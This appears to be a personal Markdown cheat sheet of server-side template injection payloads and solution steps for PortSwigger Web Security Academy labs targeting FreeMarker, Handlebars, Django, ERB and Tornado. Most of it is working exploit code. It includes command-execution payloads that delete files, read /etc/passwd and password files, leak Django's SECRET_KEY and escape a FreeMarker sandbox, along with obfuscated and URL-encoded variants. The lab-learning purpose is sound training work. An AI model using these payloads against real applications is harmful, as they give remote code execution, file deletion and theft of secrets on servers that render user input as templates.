## General info
- repo for [SSTI cheatsheet](https://github.com/Hackmanit/template-injection-table) and [cheatsheet](https://cheatsheet.hackmanit.de/template-injection-table/) itself
```
<%'${{/#{@}}%>{{ --> sometimes # causes drop of second part of polyglot
<%'${{/{@}}%>{{ --> try this also (or move # to the end)
```
- image from PortSwigger to identify template engine:
![ssti-flow](./img/ssti/ssti_flow.jpg "How to identify template engine")
- write up [#2](https://medium.com/@armaanpathan/breaking-the-barrier-remote-code-execution-via-ssti-in-freemarker-template-engine-9797079752ac)

## LAB payloads
#### Server-side template injection using documentation
- find edit template function
- try to get error, for example ${product.data}
- find that freemarker is used
- **${7*7}** - check
- ssti in freemarker [link](https://www.synack.com/exploits-explained/exploits-explained-discovering-a-server-side-template-injection-vuln-in-freemarker/)
```
${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(16?lower_abc+23?lower_abc+4?lower_abc)}

${"freemarker.template.utility.Execute"?new()("pwd")} --> decoded payload
${"freemarker.template.utility.Execute"?new()("cat /home/carlos/morale.txt")}
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```
or
- **${someExpression}** - get error, find freemarker usage
- use payload from this [PS research](https://portswigger.net/research/server-side-template-injection)
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

#### Server-side template injection in an unknown language with a documented exploit
- find that error is from handlebars and node.js
```
<%'${{/#{@}}%>{{
```
- google handlebars and find payload from payload all the things for [SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md)
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

--> one line:
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('ls -la');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}

--> and encode it
{{%23with+"s"+as+|string|}}{{%23with+"e"}}{{%23with+split+as+|conslist|}}{{this.pop}}{{this.push+(lookup+string.sub+"constructor")}}{{this.pop}}{{%23with+string.split+as+|codelist|}}{{this.pop}}{{this.push+"return+require('child_process').execSync('rm+/home/carlos/morale.txt')%3b"}}{{this.pop}}{{%23each+conslist}}{{%23with+(string.sub.apply+0+codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```
or
```
${{<%[%'"}}%\ --> into the message param

https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

#### Server-side template injection with information disclosure via user-supplied objects
- find edit template
```
{{7*7}} --> get error, find that django is used
{%debug%} --> works, search for settings
{{settings.SECRET_KEY}}
```

#### Server-side template injection in a sandboxed environment
- find edit template
```
<#assign freemver = .version>
${freemver} --> check version and google about its vulnerabilities (CVE-2021-25770), look at write up (#2)

<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat /etc/passwd")}

<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat /home/carlos/my_password.txt")}
```
or
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

#### Server-side template injection with a custom exploit
Notice that when you upload an invalid image, the error message discloses a method called **user.setAvatar()**. Also take note of the file path **/home/carlos/User.php**. You will need this later
- Upload a valid image as your avatar and load the page containing your test comment.
- In Burp Repeater, open the POST request for changing your preferred name and use the blog-post-author-display 
  parameter to set an arbitrary file as your avatar: **user.setAvatar('/etc/passwd')**
- Load the page containing your test comment to render the template. Notice that the error message indicates that you 
  need to provide an image MIME type as the second argument. Provide this argument and view the comment again to refresh the template: **user.setAvatar('/etc/passwd','image/jpg')**
- To read the file, load the avatar using **GET /avatar?avatar=wiener**. This will return the contents of the 
  **/etc/passwd** file, confirming that you have access to arbitrary files.
- Repeat this process to read the PHP file that you noted down earlier: **user.setAvatar('/home/carlos/User.php',
  'image/jpg')**
- In the PHP file, Notice that you have access to the **gdprDelete()** function, which deletes the user's avatar. You 
  can combine this knowledge to delete Carlos's file.
- First set the target file as your avatar, then view the comment to execute the template: **user.setAvatar
  ('/home/carlos/.ssh/id_rsa','image/jpg')**
- Invoke the **user.gdprDelete()** method and view your comment again to solve the lab.

#### Basic server-side template injection
- in the ERB documentation, discover that the syntax **<%= someExpression %>** is used to evaluate an expression and 
  render the result on the page
```
<%= 7*7 %>
https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>

<%= system("rm /home/carlos/morale.txt") %>
https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```

#### Basic server-side template injection (code context)
- in Tornado documentation discover that template expressions are surrounded with double curly braces, such as **{{someExpression}}**
```
POST /my-account/change-blog-post-author-display

blog-post-author-display=user.name}}{{7*7}} --> should return "name49}}"

{% somePython %} --> find in tornado docs that you are able to run Python code
{% import os %}
{{os.system('rm /home/carlos/morale.txt')

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```